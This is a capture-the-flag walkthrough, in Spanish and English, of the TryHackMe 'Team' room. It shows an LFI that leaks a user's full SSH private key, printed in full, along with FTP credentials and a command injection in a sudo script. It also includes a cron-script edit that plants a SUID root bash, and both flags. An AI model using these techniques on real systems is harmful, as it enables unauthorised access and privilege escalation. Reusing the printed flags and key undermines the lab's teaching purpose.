# Team [EASY]

---

**Room Link:** [https://tryhackme.com/room/teamcw](https://tryhackme.com/room/teamcw)

<div align="center">
  <img src="https://tryhackme-images.s3.amazonaws.com/room-icons/e8171ef71802f0f254bd38ffb0beff4b.png" width="250" alt="Team Room">
</div>

---

## Reconocimiento / Reconnaissance

Comenzamos ejecutando **nmap**, que mostró los puertos 21 (FTP), 22 (SSH) y 80 (HTTP) abiertos.

Un par de ejecuciones con **Gobuster** y **ffuf** no arrojaron más que un 403 en `/server-status`, lo cual es estándar.

## Revisando / Inspecting

Tras una inspección más cercana, el título de la web decía: "If it works, add **team.thm** to your hosts file". Inicialmente pensé que no aportaría nada, pero al añadir la IP y el nombre a `/etc/hosts` y navegar a `http://team.thm`, noté de inmediato que accedía a un sitio web real.

Es hora de iniciar **Gobuster** nuevamente y analizar el código del sitio.

Un compañero realizó un escaneo con **feroxbuster** y obtuvo hits interesantes, incluyendo `/scripts/script.txt` y `/scripts/script.old`.

En `script.old` encontramos credenciales para el FTP; específicamente un blob grande en base64 que, al ser decodificado, reveló: `ftpuser:T3@m$h@r3`.

## FTP / FTP

Al iniciar sesión vía FTP, localizamos un archivo de texto en `/workshare/New_site.txt` que revelaba que alguien está desarrollando una página para el equipo:

```text
Dale
I have started coding a new website in PHP for the team to use, this is currently under development. It can be found at ".dev" within our domain.

Also as per the team policy please make a copy of your "id_rsa" and place this in the relevent config file.

Gyles

```

## Subdominio / Subdomain

Añadimos `dev.team.thm` al archivo hosts. Es claramente un trabajo en progreso, pero parece ser el inicio de algún tipo de **team share** o carpeta compartida.

¿Podríamos subir archivos a este share para explotar alguna vulnerabilidad o subir una webshell?

## Lectura de contenido / Content Reading

No hay webshell, pero encontramos un "parameter-thing-in-the-browser". ¿Podríamos explotar un **LFI (Local File Inclusion)** para leer archivos del servidor directamente? Tras las pruebas, confirmamos que funcionaba. Pudimos leer `/etc/passwd` y también `/etc/ssh/sshd_config`.

Al final de `/etc/ssh/sshd_config`, vimos la clave privada del usuario `Dale`. No es una ubicación normal, pero era "política de la empresa". La clave necesitaba edición: al copiarla del navegador, venía en una sola línea con caracteres `#` y espacios. Aplicando un simple *find & replace* y una regex, restauramos el formato OpenSSH.

La clave privada de `Dale` es:

```text
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

```

Guardamos en `key.pem`, aplicamos `chmod 600 key.pem` y entramos vía SSH:

`ssh -i key.pem dale@10.10.x.x`

<details>
<summary><b>Click to see the first flag</b></summary>

`THM{6Y0TXHz7c2d}`

</details>

## Escalada de Privilegios / Privilege Escalation

> Tras probar mil formas de obtener root, el proceso se resume en lo siguiente:

La flag `root.txt` está en `/root`. El usuario `dale` no tiene permisos, así que debemos escalar.

Ejecutando `sudo -l` como **dale**, vemos que puede correr un script propiedad de **gyles**:

```bash
#!/bin/bash 
printf "Reading stats.\n" 
sleep 1
printf "Reading stats..\n" 
sleep 1 
read -p "Enter name of person backing up the data: " name
echo $name >> /var/stats/stats.txt
read -p "Enter 'date' to timestamp the file: " error 
printf "The Date is " 
$error 2>/dev/null 
date_save=$(date "+%F-%H-%M") 
cp /var/stats/stats.txt /var/stats/stats-$date_save.bak 
printf "Stats have been backed up\n"

```

El script es vulnerable en:

```bash
read -p "Enter 'date' to timestamp the file: " error
... 
$error 2>/dev/null

```

Cualquier cosa que introduzcamos en `$error` será ejecutada. Por lo tanto:

* Primer prompt: cualquier nombre.
* Segundo prompt: `/bin/bash`.
Esto nos da una shell como **gyles**.

Investigando con `ls -la /home/gyles`, revisamos `.bash_history`. El usuario interactúa con `/opt/admin_stuff/script.sh`.

Contenido del script:

```shell
#!/bin/bash 
#I have set a cronjob to run this script every minute

dev_site="/usr/local/sbin/dev_backup.sh" 
main_site="/usr/local/bin/main_backup.sh" 
#Back ups the sites locally 
$main_site 
$dev_site

```

Hay un **cronjob** ejecutando esto como root cada minuto. Si **gyles** tiene permisos de escritura en alguno de los scripts, podemos ganar root.

Al revisar los grupos con `id`, vemos que gyles pertenece a **lxd**, **editors** y **admin**.

Revisando permisos:

* `/usr/local/sbin/dev_backup.sh` es de **root:root**.
* `/usr/local/bin/main_backup.sh` es de **root:admin**. ¡Gyles puede editarlo!

Modificamos el script para inyectar una bash con SUID:

```shell
echo "cp /bin/bash /tmp/rootbash" >> /usr/local/bin/main_backup.sh 
echo "chmod +s /tmp/rootbash" >> /usr/local/bin/main_backup.sh

```

Esperamos un minuto, verificamos la creación de `/tmp/rootbash` y ejecutamos:

`/tmp/rootbash -p`

<details>
<summary><b>Click to see the second flag</b></summary>

`THM{fhqbznavfonq}`

</details>

## Conclusión / Conclusion

Aprendizajes clave:

* El **Virtual Hosting** basado en nombres puede ocultar mucho contenido tras una sola IP.
* Siempre probar **LFI/Path Traversal** si hay parámetros sospechosos.
* Las llaves SSH privadas son vectores de acceso directo si no están protegidas.
* La inyección de comandos en scripts de shell y el abuso de **cronjobs** con permisos de grupo mal configurados son rutas críticas para el Privilege Escalation.

---

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.
